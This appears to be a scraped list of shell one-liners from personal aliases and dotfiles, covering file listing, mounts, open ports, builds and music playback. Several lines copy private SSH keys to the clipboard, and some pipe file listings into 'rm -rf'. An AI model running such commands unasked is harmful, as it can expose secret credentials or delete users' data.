mvn --also-make dependency:tree | grep maven-dependency-plugin | awk '{ print \$(NF-1) }'
mvim; } || { alias vi=vim; }
mvim \`git status|grep 'both modified'|cut -d: -f2\`
mvim -v \`gss | sed -e 's/^[ \t]*//' | cut -d\
mv /etc/php/7.1/fpm/conf.d/20-xdebug.ini /etc/php/7.1/fpm/conf.d/20-xdebug.ini_ 2> /dev/null && restfpm || mv /etc/php/7.1/fpm/conf.d/20-xdebug.ini_ /etc/php/7.1/fpm/conf.d/20-xdebug.ini && restfpm
mv /etc/php/7.1/cli/conf.d/20-xdebug.ini /etc/php/7.1/cli/conf.d/20-xdebug.ini_ 2> /dev/null || mv /etc/php/7.1/cli/conf.d/20-xdebug.ini_ /etc/php/7.1/cli/conf.d/20-xdebug.ini
mv $HOME/.bashrc $HOME/.bashrc.mv || mv $HOME/.bashrc.mv $HOME/.bashrc
multipass list | grep microk8s-vm | awk
msg || alias msg2=:
msg || alias msg1=:
mpstat | tail -1 | awk '{print 100-\$NF}'
mpstat | tail -1 | awk '{print 100-\$(NF-1)}'
mpstat | \tail -1 | awk '{print 100-\$NF}'
mpg321 -q ~/Music/success.mp3 || mpg321 -q ~/Music/fail.mp3
mpg123 $MAIN_HOME/ca | cowthink -f $(find /usr/share/cows -type f | shuf -n 1)
mpd || true && ncmpcpp
mpc playlist | nl | cut -c 1-80
mpc playlist | cat -n | grep -i
mpc ls Files | grep Juicy | mpc add; mpc repeat on; mpc play
mpc listall | sort -R | head -100 > ~/.mpd-ditto/playlists/random.m3u
mpc clear; mpc listall | gshuf -n10 | mpc add && mpc play
mpc --format=%file% | xargs | cut -d ' ' -f1
mpc --format %number[[%artist% - ]%title%]|[%file%] playlist | egrep -i
mountpoint ~/shit &>> /dev/null || encfs ~/.shit ~/shit
mount | sort | column -t
mount | grep ^\/dev | awk '{print \$1 \
mount | grep Elements | awk
mount | grep /dev/sd | column -t
mount | grep -v cgroup | column -t
mount | grep -E ^/dev | column -t
mount | grep -E --color=never '^(/|[[:alnum:]\.-]*:/)'
mount | column -t | sort -k 3 -d
mount | column -t | sort
mount | column -t | less -S
mount | column -t | grep ^\/dev
mount | column -t | grep /dev/sd
mount | column -t | grep -P
mount -l | sort --unique | column -t
mount -l | grep '^/dev/' | sort
mount -l | column -t | most
mosh slytherin -- tmux attach -d || tmux new
mosh sejump -- 'tmux a -d || tmux new'
mosh cs498 -- tmux attach || tmux new
mosh $s -- sh -c 'tmux attach || tmux'
more ~/Documents/Keys/git.txt | pbcopy | echo '=> Git key copied to pasteboard.'
more ~/.ssh/wijs_rsa.pub | pbcopy | echo '=> Wijs public key copied to pasteboard'
more ~/.ssh/wesitos.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/love_4096.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/love_4096 | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/laptok-rsa.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/laptok-rsa | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/keys/studioemma.pub | pbcopy | echo '=> Studio Emma public key copied to clipboard'
more ~/.ssh/keys/personal.pub | pbcopy | echo '=> Personal public key copied to clipboard'
more ~/.ssh/keys/id_rsa.pub | pbcopy | echo '=> Public key copied to clipboard.'
more ~/.ssh/keys/id_rsa | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_rsa_zaobot.pub | pbcopy | printf
more ~/.ssh/id_rsa_stoe.pub | pbcopy | echo '=> stoe public key copied to pasteboard'
more ~/.ssh/id_rsa_new.pub | xclip -selection clipboard | echo '=> Public key copied to clipboard.'
more ~/.ssh/id_rsa_houston.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa_github.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa4096.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa4096 | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_rsa.pub| pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.public | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.public | pbcopy | echo '=> Public RSA key copied to clipboard'
more ~/.ssh/id_rsa.pub | xsel --clipboard --input | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | xclip | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | xclip | echo '=> Public key copied to pasteboard'
more ~/.ssh/id_rsa.pub | xclip -selection clipboard | echo '=> SSH Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | xclip -selection clipboard | echo '=> Public key copied to clipboard.'
more ~/.ssh/id_rsa.pub | xclip -in -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | xclip -i | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | printf '📋Public key copied to pasteboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '🔑 %q Public key copied to pasteboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '\n\r\033[2K [ \033[00;32mPublic key copied to pasteboard.\033[0m ] id_rsa.pub\n\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '\\n\\r\\033[2K [ \\033[00;32mPublic key copied to pasteboard.\\033[0m ] id_rsa.pub\\n\\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf 'Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | printf 'Public key copied to clipboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf 'Public SSH key copied.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key ready to paste.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to pasteboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to clipboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '==> Public Key copied to clipboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf '=&gt; Public key copied to pasteboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy | printf
more ~/.ssh/id_rsa.pub | pbcopy | green '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo '🔑 Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo '› Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo 'public key copied to pasteboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo 'Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo 'Public key copied to clipboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo '> Public key copied to clipboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> public key copied to pasteboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> SSH Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied!'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to clipboard.'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to clipboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> Personal public key copied to pasteboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo '=> GitHub public key copied to pasteboard'
more ~/.ssh/id_rsa.pub | pbcopy | echo '+ Copied to clipboard!'
more ~/.ssh/id_rsa.pub | pbcopy | echo
more ~/.ssh/id_rsa.pub | pbcopy | e_success 'Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | pbcopy -selection clipboard | echo '=> Public key copied to clipboard.'
more ~/.ssh/id_rsa.pub | copy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa.pub | clip | printf '=> Public key copied to pasteboard.\n'
more ~/.ssh/id_rsa.pub | cb | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa*.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_rsa | xclip -selection clipboard | echo '=> SSH Private key copied to pasteboard.'
more ~/.ssh/id_rsa | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_rsa | xclip -selection clipboard | echo '=> Private key copied to clipboard.'
more ~/.ssh/id_rsa | pbcopy | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_rsa | pbcopy -selection clipboard | echo '=> Private key copied to clipboard.'
more ~/.ssh/id_rsa | copy | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_ns_rsa.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_ns_rsa | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_joshua.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_ed25519.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_ed25519.pub | set-clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_ed25519.pub | pbcopy | echo '=> Public key copies to pasteboard.'
more ~/.ssh/id_ed25519.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_ed25519.pub | pbcopy | echo '==> Public key copied to pasteboard…'
more ~/.ssh/id_ed25519.pub | clip | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_ed25519 | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_ed25519 | set-clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_ed25519 | pbcopy | echo '=> Private key copied to pasteboard.'
more ~/.ssh/id_dsa.public | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_dsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_baro.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
more ~/.ssh/id_baro | xclip -selection clipboard | echo '=> Private key copied to pasteboard.'
more ~/.ssh/git_rsa.pub | pbcopy | printf '=> Git Public key copied to pasteboard.\n'
more ~/.ssh/git.priv | xclip -selection clipboard | echo '=> Github private key copied to pasteboard.'
more ~/.ssh/$SSH_KEY_FILE_NAME.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more ~/.ssh/$SSH_KEY_FILE_NAME | pbcopy | echo '=> Private key copied to pasteboard.'
more {$XDG_CONFIG_HOME}/ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more $ZSH/ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more $PUBLIC_KEY | pbcopy | echo '=> Public key copied to pasteboard.'
more $HOME/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to pasteboard.\n'
more $HOME/.ssh/id_rsa.pub | pbcopy | echo 'Public key copied to pasteboard.'
more $HOME/.ssh/id_rsa.pub | pbcopy | echo '=> Work Public key copied to pasteboard.'
more $HOME/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
more $HOME/.ssh/id_local.pub | pbcopy | echo '=> Home Public key copied to pasteboard.'
mongo_stop || true && docker run --name mongo_db -d -p 27017:27017 -d --volumes-from mongo-data mongo
mntHEPEX | mntCMSRAID | mntVPT
mm 2>/dev/null |grep Install|tee mm.log
mlb -s | head -n21 | tail -n6
mkisofs || true
mkdir tmp || true && cd tmp
mkdir /usr/local/etc/postgresql/11/main/conf.d || pg_ctlcluster 11 main start
mkdir /tmp/$(date +%B%d) 2>null || cd /tmp/$(date +%B%d)
mkdir -p ~/abs/$(pwd | cut -c10-); cp err.txt generated.file succ.txt ~/abs/$(pwd | cut -c10-)
mkdir -p ~/Logs/irc ; sic -h chat.freenode.com | tee ~/Logs/irc/$(date +%m%d)$(date +%H%M)chat.log | lolcat
mkdir $HOME/Roinaa/tyoasiat && encfs $HOME/Roinaa/.encrypted $HOME/Roinaa/tyoasiat || rmdir $HOME/Roinaa/tyoasiat
minikube delete || true && rm -rf ~/.minikube
mingw-get list | grep Package: | grep
meteor mongo --url prock.meteor.com | cut -d: -f3 | cut -d@ -f1
memdump --servers 127.0.0.1:11211|tee /tmp/__s|xargs -i{} memcat --servers 127.0.0.1:11211 {};cat /tmp/__s
memdump --servers 127.0.0.1:11211|tee /tmp/__s|xargs -i{} memcat --servers 127.0.0.1:11211 {}
media . . --last -o | sort | uniq
mdfind -name xcode -0 | xargs -0 du -shm | sort -rn
md5sum .claws-mail/**/* 2>/dev/null| md5sum; md5sum Mail/**/* 2>/dev/null | md5sum;
mas outdated | cut -b 1-9 | xargs mas upgrade
maria_stop || true && docker run --name mariadb_server -d -p 3306:3306 --volumes-from mariadb_volume -e MYSQL_ROOT_PASSWORD=secret mariadb
mandoc -Tlint ../man/man9/fusebuf.9 || [ $? -lt 4 ] && install ../man/man9/fusebuf.9 /usr/share/man/man9/
mandoc -Tlint ../man/man4/fuse.4 || [ $? -lt 4 ] && install ../man/man4/fuse.4 /usr/share/man/man4/
man || alias help=tldr
man ascii | col -b | grep -A 55 'The octal set'
man \`find /usr/share/man -type f | shuf | head -1\`
man \!* | nkf --euc | more
man -t $0 | ps2pdf - - | open -f -a Preview
man -k '*' | grep -Ee 'stat\((1|8)\) '
man -k ' ' | grep -Ee 'stat \((1|8)\) '
man $(ls /bin | shuf | head -1)
man $(find /usr/share/man -type f | sort -R | head -n1)
man $(compgen -c | sort -u | fzf)
maketargets | selecta | xargs make
make clean && make release -j$(cat /proc/cpuinfo | grep processor | wc -l) && make download
make clean && make debug -j$(cat /proc/cpuinfo | grep processor | wc -l) && make download-debug
make clean && make -j$(cat /proc/cpuinfo | grep processor | wc -l)
make SDK | sed 's/.*error.*/${color[red]}\0${color[reset]}/' | sed 's/.*successful.*/${color[green]}\0${color[reset]}/'
make 2>&1 | tee build.log | less -RiMS +F
make 2> /tmp/mkls_tmp || less /tmp/mkls_tmp
make -rpn | sed -n -e '/^$/ { n ; /^[^ .#][^ ]*:/p ; }' | egrep --color '^[^ ]*:'
make -qsp 2>/dev/null | egrep '^[^#%\.=]*:[^=]' | awk -F ': ' '{ print $2}'
make -j$(sysctl -a | grep ^hw[.]ncpu | cut -d' ' -f2)
make -j$(cat /proc/cpuinfo | grep processor | wc -l)
make -j$(cat /proc/cpuinfo | grep '^processor' | wc -l)
make -j$( cat /proc/cpuinfo | grep processor | wc -l)
make -j `cat /proc/cpuinfo | grep processor | wc -l`
make -j $(lscpu --parse=CPU | grep -v '^#' | wc -l)
make -j $((`cat /proc/cpuinfo|grep processor|wc -l`*2))
make -j $(($(cat /proc/cpuinfo | grep processor | wc -l)+1))
make -Bnd | make2graph | dot -Tpng -o $HOME/tmp/out.png && o $HOME/tmp/out.png
make && { make test || make check; }
maim -s | tee /tmp/screen.png | xclip -selection clipboard -t image/png
maim -s -d 5| tee /tmp/screen.png | xclip -selection clipboard -t image/png
maim -d 5| tee /tmp/screen.png | xclip -selection clipboard -t image/png
mac;echo;echo Show Mac Arthur svn path:;echo;svn info | egrep URL | awk '{print $2}';echo;cd-
m$i | c | gr
lynx -dump randomfunfacts.com | grep -A 3 U | sed 1D
lt 2 ; git diff $(lt 2 | head -1) $(lt 2 | tail -1)
lstun | awk '{print \$2}' | xargs kill -15
lspci | grep NVIDIA | cut -b -8
lspci | egrep 'VGA|3D'
lspci -vnnn | perl -lne 'print if /^\d+\:.+(\[\S+\:\S+\])/' | grep VGA
lspci -v -s $(lspci | grep ' VGA ' | cut -d
lspci -nnk | grep -i vga -A3 | grep 'in use'
lspci -k | grep -A 2 -E '(VGA|3D)'
lsof | grep TCP | grep [r]uby
lsof | awk '!/^\$/ && /\// { print \$9 }' | sort -u
lsof -s | grep deleted | sort -k 8
lsof -nPi | grep LIST | awk
lsof -nP | grep UDP | grep LISTEN
lsof -nP | grep TCP | grep LISTEN
lsof -nP +c 15 | grep LISTEN | grep 3306
lsof -nP +c 15 | grep LISTEN | grep
lsof -i:8080 | grep [p]ython | awk '{print \
lsof -i:8000 | grep [p]ython | awk '{print \
lsof -i | grep -E '(LISTEN|ESTABLISHED)'
lsof -i tcp:8000 | grep php | awk '{ print $2 }'
lsof -i tcp:3000 -Fp|tr -d p|xargs kill -9
lsof -i tcp:$1 && kill $(lsof -i tcp:$1 | tail -n +2 | awk '{ print $2 }')
lsof -i -n | head -1; lsof -i -n | grep
lsof -i -n | egrep 'COMMAND|LISTEN'
lsof -i -n -l|grep Spotify|cut -d\
lsof -i -n -P |head -1 && lsof -i -n -P |grep --color=never LISTEN
lsof -i -n -P |grep TCP |grep LISTEN
lsof -i -n -P | grep TCP | grep LISTEN
lsof -i -n -P | grep TCP | grep 5000
lsof -i -n -P | grep ESTABLISHED | grep rethink
lsof -i -n -P | egrep 'COMMAND|LISTEN'
lsof -i -P | grep LISTEN | ccze -A
lsof -i -P | grep ESTABLISHED | sort
lsof -Pni4 | grep LISTEN | grep php
lsof -Pni4 | grep LISTEN | grep
lsof -Pn -i4 -i6 | grep LISTEN | grep
lsof -Pi | grep -E '(LISTEN|ESTABLISHED)'
lsof -P -i -n | cut -f 1 -d ' ' | uniq
lsof -P -i -n +c0 | iconv -c -f utf-8 -t ascii | awk '{printf \
lsof +c 0 | grep -w DEL | awk
lsof +c 0 | grep 'DEL.*lib' | awk '{ print \$1 \
lsof +c 0 | grep 'DEL.*lib' | awk '1 { print $1 \
lsmod | sort | less
lsl | grep ^d | sed -Ee s/^.*\(\[\ \]\)\(\[^\ \]*\)$/\\2/
lsl /Users/bar/mail/incoming/*.spool | grep 'bar *staff *[1-9]' | perl -ne 's/.*incoming\/(.*)\.spool/\$1/ && print;'
lscpu || less /proc/cpuinfo
lscpu || cat /proc/cpuinfo
lscpu | grep GHz | awk
lscpu | grep 'Architecture' | awk '{print \$2}'
lsco -cview -avobs -s | sort -r | xargs -i -n 15 -P 2 --no-run-if-empty cleartool unco -rm
lsco -cview -all -s | sort -r | xargs -i -n 15 -P 2 --no-run-if-empty cleartool unco -rm
lsblk -l | tail -n +2 | awk
lsb_release -i | sed 's/Distributor ID://' | sed 's/[[:space:]]//g'
lsb_release -c | xargs | grep --color=no -oE '[a-zA-Z0-9_-]+$'
lsa | awk '{print \$8}' | ruby -ne 'puts \$_.split(\
lsa | ack '^d' | awk '{print \$8}'
ls-lha | grep -E '([0-9]+(M|G)+)*'
ls ~/stuff/record/ -Art | tail -n 1 | xargs mpv
ls ~/git | fzf | xargs -I{} tmux send-keys 'cd ~/git/'{} 'C-m'
ls ~/Pictures/screenshots -Art | tail -n 1 |xargs -I {} echo /home/owo/Pictures/screenshots/{}
ls ~/Code/puppet4/hieradata/hosts/ | sed -e's/.yaml$//' | grep
ls ~/.ssh/*.pub | sed 's/.pub//' | xargs ssh-add -K
ls || alias ls=l
ls |sort -R | tail -1
ls | xargs du -hs | sort --human-numeric-sort
ls | xargs -n 1 -I f echo f | rev
ls | xargs -I % du -s -m % | sort -g
ls | wc | awk '{print $1}'
ls | sort -R | tail -n1
ls | sort -R | head -n 1
ls | sort -R | head -1
ls | sort -R | head
ls | shuf | sxiv -a -i
ls | rev | cut -d
ls | percol | xargs vim
ls | percol | xargs tail
ls | percol | xargs less
ls | percol | xargs head
ls | percol | xargs emacs
ls | percol | xargs
ls | ipt -m | xargs rm -rf
ls | grep xcworkspace | xargs open
ls | grep xcodeproj | xargs open
ls | grep .zip | parallel atool -x {}
ls | grep -v *.tgz | xargs rm
ls | grep -v $1 | xargs rm -rfv
ls | grep '\.'ll | xargs -I{} rm {}
ls | fzf | xargs -r trash-put
ls | figlet | toilet --gay -f term
ls | cowsay -f duck | lolcat
ls | awk -F'.' '{print \$NF}' | bar_chart.py --sort-keys
ls log*201*.log | tail -1 | xargs less -i -f -R
ls db/migrate/* | tail -n1 | xargs emacsclient -n
ls 2> >(grep -Ev 'Brak dostępu|Brak dostępu|Permission denied' >&2)
ls /usr/bin | xargs whatis | less
ls /mnt/Shared/cd/**/*.ogg /mnt/Shared/cd/**/*.wav | rofi -dmenu | xargs chronic ffplay -loop 0 &
ls /home/inigo/Documents/vpn/ | grep .ovpn | tr -d
ls /home/bk/xkcd_archive/ | sort -n | tail -1
ls /etc/rc2.d/S01dbus /etc/rc2.d/S01nginx /etc/rc2.d/S01rsync | grep S | awk '{sub(\
ls /dev/ | grep fw | wc -l
ls /dev/ | grep fw | sort --human-numeric-sort
ls . | shuf -n 10 | xargs -I '{}' mv '{}' ../../test/`basename $PWD`/
ls -trp | grep -v / | tail -1
ls -tr ~/logs | tail -n5; g ~/logs/`ls -tr ~/logs | tail -n1`
ls -tr | tail -n 1 | xargs gnome-open
ls -tr | tail -n 1 | xargs -o vim
ls -tr | head -n $((`ls -tr | wc -l`-1))
ls -tr tmp/capybara/*png | tail -1 | xargs open
ls -td -1 $HOME/Downloads/* | head -n 1 | xargs -I {} mv {} .
ls -t1 /houzz/c2/log/log_* | head -n1 | xargs tail -n200 -f
ls -t1 /houzz/c2/log/error_* | head -n1 | xargs tail -n200 -f
ls -t1 /houzz/c2/log/common_log_* | head -n1 | xargs tail -n200 -f
ls -t ~/Downloads/ | head -1 | xargs -I '%' mv ~/Downloads/'%'
ls -t ~/Documents/Github | fzf --layout=reverse | xargs -I{} tmux new-session -s {} -c ~/Documents/Github/{} -d
ls -t | head -1 | xargs -0 xdg-open
ls -t | awk '/16.*/{print $NF}' | sed ':a;N;$!ba;s/\n/ /g'
ls -t massif.out.*|head -n 1|xargs massif-visualizer
ls -t log_*.txt | head -1 | xargs -I {} sublime -n {}
ls -t callgrind.out.*|head -n 1|xargs qcachegrind
ls -t ${TOMCAT_HOME}/logs/tomcat/*catalina.out | head -1 | xargs tail -f
ls -t $DOWNLOADS/ | nl2nul | xargs -0 -L0 -I {} echo \
ls -sF |sort -nr | head
ls -s | sort -n | tail -50
ls -rt|tail -n1|xargs less -f
ls -p|grep [^/]$|xargs ls -lh --color
ls -p | grep [^/]$ | xargs -i du -sh {}
ls -p --color=tt | grep -v / | tr '\r\n' '\t'
ls -ohgG | cut -c 16- | tail -n +2
ls -l|sort -k 5nr|head -30
ls -ltr | sort -n -k 5 | more
ls -ltr --time-style='+%Y-%m-%d %H:%M:%S' | grep '^[d|l]'
ls -lta | grep dr | sort
ls -lt | grep ^d | sort -fk9
ls -ls|sort -nr|more
ls -lsR | sort -nr|less
ls -lrt | tail -5 | awk '{print $NF}'
ls -lrt | cut -f1 | grep dr
ls -li | sort -n | more
ls -lhtrF --time-style=+'%Y-%m-%d %H:%M:%S' | tail -n +2 | fzf -0
ls -lhR | grep '^-' | sort -k 5 -rn
ls -lhF --time-style=+'%Y-%m-%d %H:%M:%S' | tail -n +2 | fzf -0
ls -lhAF --time-style=+'%Y-%m-%d %H:%M:%S' | tail -n +2 | fzf -0
ls -lh | more | grep
ls -lh | grep -E '([0-9]+(M|G)+)*'
ls -lh | grep '^d' | rainbowify
ls -lct /etc | tail -1 | awk
ls -laF | grep '^d' && ls -lap | grep -v '^d'
ls -la | sort -n -k 5 | tail
ls -la | grep '^d' && ls -la | grep -v '^d'
ls -la | ${grepcolor} grep -E '^d' | ${grepcolor} grep -E '\S+$'
ls -lSh -- *(.) | grep -v total | head $@ 2&>/dev/null
ls -lR | grep ^d | wc -l
ls -lR | grep -v ^l | wc -l
ls -lGg --block-size=1000000000 --time-style=long-iso |grep ^l |cut -d' ' -f7-
ls -lAh | grep -m 1 total | sed 's/total //'
ls -lA | grep ^d | sed -r 's/.+[[:digit:]]{2}:[[:digit:]]{2}\s*(.+)/\1/g'
ls -lA | grep -v ^d | sed -r 's/.+[[:digit:]]{2}:[[:digit:]]{2}\s*(.+)/\1/g'
ls -l1 \$(php -i | grep ^extension_dir | sed 's/.* => //')
ls -l ~/backups/audit | cut -c 31- | tail -n +2
ls -l ~/Dropbox\ \(CARD.COM\)/card_db_backups | grep sanitize | cut -d ' ' -f 8-15
ls -l |grep -v '^d' |ls
ls -l | wc -l | egrep grep
ls -l | sort -k 5.5gr | head -10
ls -l | sort -k 5 -g | less
ls -l | grep ^l | wc -l
ls -l | grep ^d | wc -l
ls -l | grep ^- | wc -l
ls -l | grep -v grep | grep -i -e VSZ -e
ls -l | grep -v ^l | wc -l
ls -l | grep -v ^1 | wc -l
ls -l | grep '^d' | wc -l
ls -l /var/log/ | fzf | read mode b user group size m d t file ; nvim /var/log/$file
ls -l ./|grep -v ^l|wc -l
ls -l ./|grep -v ^1|wc -l
ls -l --no-group | cat | ack -o \
ls -l --color=auto | sort -n +3 | tail -10
ls -l --color=always| egrep ^d|tail
ls -l */* | grep ^- | wc -l
ls -l $1 | grep -v ^l | wc -l
ls -halp | grep -v / | awk '{print \$5 \
ls -h $([[ $OSTYPE == darwin* ]] && echo -G || echo --color=auto)
ls -d */|sed 's/\// /g'|xargs ls -d --color
ls -d */.hg */**/.hg | sed -e 's/\/\.hg$//' | column
ls -d */.git */**/.git | sed -e 's/\/\.git$//' | column
ls -c | head -1 | xargs -i woof {}
ls -asF | grep -v / | sort -rn
ls -al|grep ^d|wc -l
ls -al|grep ^d|grep -v '\.'
ls -altr | grep -v '^d' | tail -n 10
ls -ald $1 .??* 2> /dev/null || echo 'No hidden files'
ls -alF --color | grep \/ | sort
ls -al | grep -v .DS_Store | grep -v .pyc
ls -ad . .. | grep / | more -p
ls -aF | grep / | sed -e 's:/::'
ls -a | grep '^\..*\.sw[ponmlkjih]$' | xargs rm
ls -a | fzf -m | xargs rm
ls -UF | grep -v | wc -l
ls -UF | grep -v / | wc -l
ls -U1F | grep -v / | wc -l
ls -Rl | grep ^- | wc -l
ls -R | sort -R | tail -1
ls -R | grep :*/ | grep
ls -R | grep : | sed -e
ls -R --directory --color=never */.git | sed 's/\/.git//' | xargs -P10 -I{} git -C {} pull
ls -F|grep /|wc -l
ls -F |grep -v / | wc -l
ls -F | grep -v / | wc -l
ls -F | grep '\*' | sed 's/\*$//'
ls -F | grep '/$' | xargs -n6
ls -F | grep '/$' | xargs -n4
ls -F | \grep / | tr '\n' '\t'
ls -F | \grep -v / | tr '\n' '\t'
ls -F node_modules | sed -n 's/@$//p' | xargs npm ls -g --depth 0
ls -F --color 2>/dev/null || ls -FG
ls -F --color --time-style=long-iso -lA 2>/dev/null || ls -lAFGT
ls -F $1 | grep \/ | sed -e 's/\/$//g'
ls -Atl | head -2 | tail -1
ls -Ahrtls | tail -n5 | tac
ls -A | percol | xargs
ls -A | grep ^\\. | column -c 80
ls -A | grep / | cut -f1 -d/
ls -A | grep '\\.sw.$' | xargs rm -f
ls -1tr log*.txt | tail -1 | xargs cat
ls -1tr err.txt generated.file succ.txt | tail -1 | awk '{print \$9}'
ls -1t ~/.iterm_logs/*.log | tail -n+10 | xargs rm -v
ls -1t | tail -n +2 | head -n
ls -1drt err.txt generated.file succ.txt | tail -1 | xargs cat
ls -1Ap | grep '/$' | column
ls -1AF | sed '/[@/]$/d;s/\*$//' |column
ls -1 | wc -l | trim
ls -1 | wc -l | sed s/[^0-9]//g
ls -1 | tr '\n' '\0' | xargs -0 -n 1 basename
ls -1 | grep -v .git | xargs rm -rf gvim
ls -1 /bin | xargs -l1 whatis 2>/dev/null | grep -v \
ls -1 $LOGFILE | grep -v $FILE_FORMAT | grep -v bkup
ls --group-directories-first | head -n 1 | cd
ls --color=never tmp/capybara/*.png | tail -n 1 | xargs xdg-open
ls --color=auto 2> >(grep -Ev 'Brak dostępu|Brak dostępu|Permission denied' >&2)
ls --color=always | grep rpm | more
ls --color -d *(-/DN) 2>/dev/null || ls -dG *(-/DN)
ls --color -Fl --time-style=long-iso 2>/dev/null || ls -FGlT
ls --color -FA 2>/dev/null || ls -FAG
ls --color --time-style=long-iso -lFh 2>/dev/null || ls -lFhGT
ls */migrations/*.py | egrep -v __init__.py | xargs rm
ls */* 2>/dev/null || ls err.txt generated.file succ.txt
ls *.tex | sed -E -e 's/ /\n/' -e 's/^(.+).tex\$/\1.aux \1.log \1.synctex.gz \1.fdb_latexmk \1.fls \1.out \1.dvi/' | xargs rm 2> /dev/null
ls *.py|percol|xargs python3
ls *.flv | grep -v -e 'blog*' -e 'gcb' | umplayer
ls ${LS_FLAGS} -a | head -3 | tail -2
lpass show -c --password $(lpass ls | fzf | awk
lpass show -c --password $(lpass ls | fzf --height 50% --border | awk
lpass ls | peco | sed -e 's/.*\[id\:\ \(.*\)\]/\1/'
lpass ls | fzf | grep -E -o \
lpass ls --format '%an - %au - %ai' | fzf | awk -F' - ' '{ print \$3 }'
lorem-ipsum --units paragraphs --count 5 | fold -s | vim -
loggi down;for e in $(docker images|awk '{print $1}'|grep -v REPOSITORY); do docker pull $e;done;loggi up;loggi git-hooks;loggi fix-keys;loggi pip-install
log stream --style compact --predicate 'messageType == error || messageType == fault'
log show system_logs.logarchive | grep sentinel | vim -
locate node_modules | perl -pne 's{(/node_modules).+}{\$1\n}xmsg' | uniq
locate -e --regex '\.pac(new|orig|save)$'
loadkeys us > /dev/null 2>&1 || setxkbmap us
loadkeys dvorak > /dev/null 2>&1 || setxkbmap us dvorak
loadkeys colemak > /dev/null 2>&1 || setxkbmap us colemak
ln -fs $(echo $DISPLAY | sed 's:\(/private/tmp/com\.apple\.launchd\.[^/]*\)/.*:\1:') $(echo $DISPLAY | sed 's:/private/tmp/com\.apple\.launchd\.\([^/]*\)/.*:/private/tmp/launch-\1:'); ssh
lldb -c /cores/`ls -rt /cores| tail -n 2| head -n 1`
